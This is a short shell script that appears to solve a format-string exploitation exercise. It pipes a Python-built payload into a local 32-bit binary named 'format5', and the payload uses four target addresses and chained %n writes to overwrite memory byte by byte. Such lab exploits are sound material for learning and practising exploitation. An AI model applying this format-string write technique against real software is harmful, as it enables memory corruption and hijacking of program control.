#!/bin/sh

#gcc -o format5 -m32 format5.c
python -c "print '\x1c\xa0\x04\x08\x1d\xa0\x04\x08\x1e\xa0\x04\x08\x1f\xa0\x04\x08%219c%7\$n%153c%8\$n%128c%9\$n%4c%10\$n'" |./format5
